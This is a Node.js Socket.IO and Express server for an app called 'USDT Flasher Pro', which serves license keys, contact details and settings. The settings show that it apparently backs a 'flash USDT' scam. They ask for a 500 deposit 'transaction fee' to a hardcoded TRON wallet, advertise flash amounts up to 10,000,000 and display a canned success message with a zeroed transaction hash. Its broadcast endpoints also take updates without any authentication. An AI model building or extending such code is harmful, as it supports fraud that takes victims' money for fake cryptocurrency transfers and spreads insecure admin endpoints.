const { Server } = require('socket.io');
const http = require('http');
const express = require('express');
const axios = require('axios');
const bodyParser = require('body-parser');

// Create Express app and HTTP server
const app = express();

// Configure Express middleware
app.use(bodyParser.json());
const server = http.createServer(app);

// Create Socket.IO server with CORS configuration
const io = new Server(server, {
  cors: {
    origin: '*',
    methods: ['GET', 'POST']
  }
});

// API base URL
const API_BASE_URL = process.env.API_BASE_URL || 'https://usdtflasherpro.netlify.app/.netlify/functions';
console.log('Using API base URL:', API_BASE_URL);

// Fallback data (used when API is unavailable)
const fallbackLicenseKeys = [
  {
    id: 1,
    key: 'USDT-ABCD-1234-EFGH-5678',
    status: 'active',
    created_at: '2025-01-15T10:30:00.000Z',
    expires_at: '2026-01-15T10:30:00.000Z',
    user: 'test@gmail.com',
    type: 'demo',
    maxAmount: 30
  },
  {
    id: 2,
    key: 'USDT-IJKL-9012-MNOP-3456',
    status: 'active',
    created_at: '2025-02-20T14:45:00.000Z',
    expires_at: '2026-02-20T14:45:00.000Z',
    user: 'live@gmail.com',
    type: 'live',
    maxAmount: 10000000
  },
  {
    id: 3,
    key: 'YGMI-7B5L-GVUF-SL1Q',
    status: 'active',
    created_at: '2025-03-05T10:00:00.000Z',
    expires_at: '2026-03-05T10:00:00.000Z',
    user: 'live@gmail.com',
    type: 'live',
    maxAmount: 10000000
  }
];

const fallbackContactInfo = {
  primaryPhone: '+447013216​28',
  secondaryPhone: '+14693510740',
  tertiaryPhone: '+91 7823232332',
  email: 'support@usdtflasherpro.com',
  website: 'https://usdtflasherpro.com',
  telegramUsername: '@usdtflasherpro',
  discordServer: 'discord.gg/usdtflasherpro'
};

const fallbackAppSettings = {
  appVersion: '4.8',
  updateChannel: 'stable',
  autoUpdate: true,
  theme: 'dark',
  accentColor: '#00e6b8',
  animationsEnabled: true,
  sessionTimeout: 30,
  requirePasswordOnStartup: true,
  twoFactorAuth: false,
  defaultNetwork: 'trc20',
  demoMaxFlashAmount: 30,
  liveMaxFlashAmount: 10000000,
  defaultDelayDays: 0,
  defaultDelayMinutes: 0,
  debugMode: false,
  logLevel: 'info',
  apiEndpoint: 'https://api.usdtflasherpro.com/v1',
  // Payment settings
  depositAmount: 500,
  transactionFee: 'Transaction Fee',
  walletAddress: 'TRX7NVHDXYv12XA9P2LCWQrAALM9hN2JpV',
  // Success modal settings
  successTitle: 'Success',
  successMessage: 'The flash has been sent successfully',
  transactionHash: '000000000000000000000000000000000000'
};

// In-memory cache for data
let cachedLicenseKeys = [...fallbackLicenseKeys];
let cachedContactInfo = {...fallbackContactInfo};
let cachedAppSettings = {...fallbackAppSettings};

// Store connected clients
const connectedClients = new Set();

// Handle socket connections
io.on('connection', (socket) => {
  console.log('Client connected:', socket.id);
  connectedClients.add(socket.id);

  // Send initial data to the client
  sendInitialData(socket);

  // Handle disconnection
  socket.on('disconnect', () => {
    console.log('Client disconnected:', socket.id);
    connectedClients.delete(socket.id);
  });

  // Handle license key validation request
  socket.on('validateLicenseKey', async (data) => {
    console.log('Received license key validation request:', data);
    try {
      let licenseKeys, appSettings;
      
      // Try to fetch license keys from remote API
      try {
        console.log(`Fetching license keys from: ${API_BASE_URL}/license-keys`);
        const response = await axios.get(`${API_BASE_URL}/license-keys`);
        licenseKeys = response.data;
        console.log('Successfully fetched license keys:', licenseKeys);
        // Update cache
        cachedLicenseKeys = licenseKeys;
      } catch (error) {
        console.error('Error fetching license keys from remote API:', error.message);
        // Use cached data
        console.log('Using cached license keys:', cachedLicenseKeys);
        licenseKeys = cachedLicenseKeys;
      }
      
      // Find the license key
      const licenseKey = licenseKeys.find(license => license.key === data.licenseKey);
      console.log('Found license key:', licenseKey);
      
      if (!licenseKey) {
        console.log('License key not found in cached keys:', data.licenseKey);
        console.log('Deferring validation to client-side validation');
        // Don't send a response here, let the client-side validation handle it
        return;
      }
      
      // Check if license key is active
      if (licenseKey.status !== 'active') {
        console.log('License key is not active:', licenseKey.status);
        socket.emit('licenseKeyValidation', { valid: false, message: `License key is ${licenseKey.status}` });
        return;
      }
      
      // Check if license key has expired
      const expiryDate = new Date(licenseKey.expires_at || licenseKey.expiresAt);
      if (expiryDate < new Date()) {
        console.log('License key has expired:', expiryDate);
        socket.emit('licenseKeyValidation', { valid: false, message: 'License key has expired' });
        return;
      }
      
      // Try to fetch app settings from remote API
      try {
        console.log(`Fetching app settings from: ${API_BASE_URL}/app-settings`);
        const appSettingsResponse = await axios.get(`${API_BASE_URL}/app-settings`);
        appSettings = appSettingsResponse.data;
        console.log('Successfully fetched app settings:', appSettings);
        // Update cache
        cachedAppSettings = appSettings;
      } catch (error) {
        console.error('Error fetching app settings from remote API:', error.message);
        // Use cached data
        console.log('Using cached app settings:', cachedAppSettings);
        appSettings = cachedAppSettings;
      }
      
      // Determine license type and user
      const isDemo = licenseKey.type === 'demo' || data.licenseKey === 'USDT-ABCD-1234-EFGH-5678';
      const user = isDemo ? 'test@gmail.com' : 'live@gmail.com';
      const type = isDemo ? 'demo' : 'live';
      
      // Use max_amount from database if available, otherwise use app settings
      let maxAmount;
      if (licenseKey.max_amount !== undefined && licenseKey.max_amount !== null) {
        // Use the max_amount from the database
        maxAmount = licenseKey.max_amount;
        console.log(`Using max amount from database: ${maxAmount}`);
      } else {
        // Fallback to app settings
        maxAmount = isDemo ? appSettings.demoMaxFlashAmount : appSettings.liveMaxFlashAmount;
        console.log(`Using max amount from app settings: ${maxAmount}`);
      }
      
      // Add license type and user to the response
      licenseKey.type = type;
      licenseKey.user = user;
      licenseKey.maxAmount = maxAmount;
      
      // Update cached license keys with this validated key
      const existingKeyIndex = cachedLicenseKeys.findIndex(k => k.key === licenseKey.key);
      if (existingKeyIndex >= 0) {
        cachedLicenseKeys[existingKeyIndex] = {...licenseKey};
      }
      
      console.log('Sending license key validation response:', { valid: true, licenseKey });
      socket.emit('licenseKeyValidation', { valid: true, licenseKey });
    } catch (error) {
      console.error('Error validating license key:', error);
      
      // Try to validate using cached data as a last resort
      try {
        console.log('Attempting to validate with cached data');
        const licenseKey = cachedLicenseKeys.find(license => license.key === data.licenseKey);
        
        if (!licenseKey) {
          console.log('License key not found in cache:', data.licenseKey);
          socket.emit('licenseKeyValidation', { valid: false, message: 'Invalid license key' });
          return;
        }
        
        if (licenseKey.status !== 'active') {
          console.log('License key is not active in cache:', licenseKey.status);
          socket.emit('licenseKeyValidation', { valid: false, message: `License key is ${licenseKey.status}` });
          return;
        }
        
        const expiryDate = new Date(licenseKey.expires_at || licenseKey.expiresAt);
        if (expiryDate < new Date()) {
          console.log('License key has expired in cache:', expiryDate);
          socket.emit('licenseKeyValidation', { valid: false, message: 'License key has expired' });
          return;
        }
        
        const isDemo = licenseKey.type === 'demo' || data.licenseKey === 'USDT-ABCD-1234-EFGH-5678';
        const user = isDemo ? 'test@gmail.com' : 'live@gmail.com';
        const type = isDemo ? 'demo' : 'live';
        
        // Use max_amount from database if available, otherwise use app settings
        let maxAmount;
        if (licenseKey.max_amount !== undefined && licenseKey.max_amount !== null) {
          // Use the max_amount from the database
          maxAmount = licenseKey.max_amount;
          console.log(`Using max amount from database: ${maxAmount}`);
        } else {
          // Fallback to app settings
          maxAmount = isDemo ? cachedAppSettings.demoMaxFlashAmount : cachedAppSettings.liveMaxFlashAmount;
          console.log(`Using max amount from app settings: ${maxAmount}`);
        }
        
        licenseKey.type = type;
        licenseKey.user = user;
        licenseKey.maxAmount = maxAmount;
        
        console.log('Sending license key validation response from cache:', { valid: true, licenseKey });
        socket.emit('licenseKeyValidation', { valid: true, licenseKey });
      } catch (fallbackError) {
        console.error('Error validating license key with fallback:', fallbackError);
        socket.emit('licenseKeyValidation', { valid: false, message: 'Error validating license key. Please try again.' });
      }
    }
  });
});

// Function to send initial data to a client
async function sendInitialData(socket) {
  console.log('Sending initial data to client:', socket.id);
  try {
    let contactInfo, appSettings;
    
    // Try to fetch contact info from remote API
    try {
      console.log(`Fetching contact info from: ${API_BASE_URL}/contact-info`);
      const contactInfoResponse = await axios.get(`${API_BASE_URL}/contact-info`);
      contactInfo = contactInfoResponse.data;
      console.log('Successfully fetched contact info:', contactInfo);
      // Update cache
      cachedContactInfo = contactInfo;
    } catch (error) {
      console.error('Error fetching contact info from remote API:', error.message);
      // Use cached data
      console.log('Using cached contact info:', cachedContactInfo);
      contactInfo = cachedContactInfo;
    }
    
    // Try to fetch app settings from remote API
    try {
      console.log(`Fetching app settings from: ${API_BASE_URL}/app-settings`);
      const appSettingsResponse = await axios.get(`${API_BASE_URL}/app-settings`);
      appSettings = appSettingsResponse.data;
      console.log('Successfully fetched app settings:', appSettings);
      // Update cache
      cachedAppSettings = appSettings;
    } catch (error) {
      console.error('Error fetching app settings from remote API:', error.message);
      // Use cached data
      console.log('Using cached app settings:', cachedAppSettings);
      appSettings = cachedAppSettings;
    }
    
    // Send data to the client
    console.log('Sending initial data to client:', { contactInfo, appSettings });
    socket.emit('initialData', {
      contactInfo,
      appSettings
    });
  } catch (error) {
    console.error('Error sending initial data:', error);
    
    // Send fallback data as a last resort
    console.log('Sending fallback data to client');
    socket.emit('initialData', {
      contactInfo: fallbackContactInfo,
      appSettings: fallbackAppSettings
    });
  }
}

// Function to broadcast contact info updates to all clients
function broadcastContactInfoUpdate(contactInfo) {
  console.log('Broadcasting contact info update to all clients:', contactInfo);
  io.emit('contactInfoUpdate', contactInfo);
}

// Function to broadcast license key updates to all clients
function broadcastLicenseKeyUpdate(licenseKeys) {
  console.log('Broadcasting license keys update to all clients');
  io.emit('licenseKeysUpdate', licenseKeys);
}

// Function to broadcast app settings updates to all clients
function broadcastAppSettingsUpdate(appSettings) {
  console.log('Broadcasting app settings update to all clients');
  io.emit('appSettingsUpdate', appSettings);
}

// Add API endpoints to serve data locally
app.get('/contact-info', (req, res) => {
  console.log('Received request for contact info');
  try {
    // Try to fetch from remote API first
    console.log(`Fetching contact info from: ${API_BASE_URL}/contact-info`);
    axios.get(`${API_BASE_URL}/contact-info`)
      .then(response => {
        // Update cache
        cachedContactInfo = response.data;
        console.log('Successfully fetched contact info:', response.data);
        // Return data
        res.status(200).json(response.data);
      })
      .catch(error => {
        console.error('Error fetching contact info from remote API, using cached data:', error.message);
        // Return cached data
        console.log('Returning cached contact info:', cachedContactInfo);
        res.status(200).json(cachedContactInfo);
      });
  } catch (error) {
    console.error('Error in contact-info endpoint:', error);
    res.status(200).json(cachedContactInfo);
  }
});

app.get('/license-keys', (req, res) => {
  console.log('Received request for license keys');
  try {
    // Try to fetch from remote API first
    console.log(`Fetching license keys from: ${API_BASE_URL}/license-keys`);
    axios.get(`${API_BASE_URL}/license-keys`)
      .then(response => {
        // Update cache
        cachedLicenseKeys = response.data;
        console.log('Successfully fetched license keys:', response.data);
        // Return data
        res.status(200).json(response.data);
      })
      .catch(error => {
        console.error('Error fetching license keys from remote API, using cached data:', error.message);
        // Return cached data
        console.log('Returning cached license keys:', cachedLicenseKeys);
        res.status(200).json(cachedLicenseKeys);
      });
  } catch (error) {
    console.error('Error in license-keys endpoint:', error);
    res.status(200).json(cachedLicenseKeys);
  }
});

app.get('/app-settings', (req, res) => {
  console.log('Received request for app settings');
  try {
    // Try to fetch from remote API first
    console.log(`Fetching app settings from: ${API_BASE_URL}/app-settings`);
    axios.get(`${API_BASE_URL}/app-settings`)
      .then(response => {
        // Update cache
        cachedAppSettings = response.data;
        console.log('Successfully fetched app settings:', response.data);
        // Return data
        res.status(200).json(response.data);
      })
      .catch(error => {
        console.error('Error fetching app settings from remote API, using cached data:', error.message);
        // Return cached data
        console.log('Returning cached app settings:', cachedAppSettings);
        res.status(200).json(cachedAppSettings);
      });
  } catch (error) {
    console.error('Error in app-settings endpoint:', error);
    res.status(200).json(cachedAppSettings);
  }
});

// Add REST endpoints for broadcasting updates
app.post('/broadcast-contact-info', (req, res) => {
  console.log('Received contact info update request');
  try {
    const contactInfo = req.body;
    console.log('Received contact info update:', contactInfo);
    
    // Update local cache
    cachedContactInfo = contactInfo;
    
    // Broadcast to all connected clients
    broadcastContactInfoUpdate(contactInfo);
    
    res.status(200).json({ success: true });
  } catch (error) {
    console.error('Error broadcasting contact info:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

app.post('/broadcast-license-keys', (req, res) => {
  console.log('Received license keys update request');
  try {
    const licenseKeys = req.body;
    console.log('Received license keys update:', licenseKeys);
    
    // Update local cache
    cachedLicenseKeys = licenseKeys;
    
    // Broadcast to all connected clients
    broadcastLicenseKeyUpdate(licenseKeys);
    
    res.status(200).json({ success: true });
  } catch (error) {
    console.error('Error broadcasting license keys:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

app.post('/broadcast-app-settings', (req, res) => {
  console.log('Received app settings update request');
  try {
    const appSettings = req.body;
    console.log('Received app settings update:', appSettings);
    
    // Update local cache
    cachedAppSettings = appSettings;
    
    // Broadcast to all connected clients
    broadcastAppSettingsUpdate(appSettings);
    
    res.status(200).json({ success: true });
  } catch (error) {
    console.error('Error broadcasting app settings:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// Export functions and objects for external use
module.exports = {
  broadcastContactInfoUpdate,
  broadcastLicenseKeyUpdate,
  broadcastAppSettingsUpdate,
  io,
  app,
  server,
  cachedLicenseKeys,
  cachedContactInfo,
  cachedAppSettings
};

// If this file is run directly (not imported as a module)
if (require.main === module) {
  // Start the server
  const PORT = process.env.SOCKET_PORT || 3030;
  server.listen(PORT, () => {
    console.log(`Socket.IO server running on port ${PORT}`);
  });
}
